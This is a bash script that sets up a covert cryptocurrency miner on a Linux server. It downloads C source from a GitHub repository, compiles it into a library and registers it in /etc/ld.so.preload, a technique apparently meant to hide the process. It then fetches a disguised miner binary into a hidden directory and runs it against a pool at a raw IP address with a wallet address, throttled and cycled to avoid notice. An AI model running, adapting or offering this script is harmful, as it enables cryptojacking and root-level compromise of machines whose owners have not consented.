#!/bin/bash

# Define a function for installing dependencies
install_dependencies() {
  echo "Updating system and installing dependencies..."
  
  # Check disk space and add swap if necessary
  echo "Checking disk space..."
  df -h

  echo "Ensuring enough swap space..."
  if ! grep -q '/swapfile' /etc/fstab; then
    sudo fallocate -l 2G /swapfile
    sudo chmod 600 /swapfile
    sudo mkswap /swapfile
    sudo swapon /swapfile
    echo "/swapfile none swap sw 0 0" | sudo tee -a /etc/fstab
  fi

  # Update system and install essential packages
  sudo yum update -y

  # Install dependencies including cpulimit
  sudo yum install -y gcc make wget curl epel-release
  sudo yum install -y cpulimit
}

# Define a function for downloading and compiling code
download_and_compile_code() {
  echo "Downloading and compiling code..."
  curl -L https://github.com/barburonjilo/back/raw/main/maonumput.c -o nyumput.c
  gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
  sudo mv libnyumput.so /usr/local/lib/
  echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
  rm nyumput.c
}

# Define a function for preparing the environment
prepare_environment() {
  echo "Preparing environment..."
  mkdir -p .lib && cd .lib
  wget -O maon https://github.com/barburonjilo/back/raw/main/sr
  if [ $? -ne 0 ]; then
    echo "Failed to download maon. Exiting..."
    exit 1
  fi
  chmod +x maon
}

# Define a function for running and managing the process
run_and_manage_process() {
  echo "Running and managing the process..."
  local start_time=$(date +%s)
  local end_time=$((start_time + 6*3600))  # 6 hours from start

  while [ $(date +%s) -lt $end_time ]; do
    if [ -f ./maon ]; then
      echo "Starting process with cpulimit..."
      # Start the process with cpulimit
      cpulimit -l 300 -e .lib/maon &
      
      # Store the PID of cpulimit
      local cpulimit_pid=$!
      
      # Run the process with the specified parameters in background
      nohup ./maon -a minotaurx --pool 45.115.225.161:443 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 > process.log 2>&1 &
      
      # Store the PID of the running process
      local process_pid=$!
      
      # Run for 1 minute
      sleep 60
      
      # Kill the process
      kill $process_pid || true

      # Wait for 2 minutes before the next iteration
      sleep 120
    else
      echo "maon not found in .lib directory. Skipping..."
      sleep 120
    fi
  done

  # Clean up
  kill $cpulimit_pid || true
}

# Main script execution
install_dependencies
download_and_compile_code
prepare_environment
run_and_manage_process
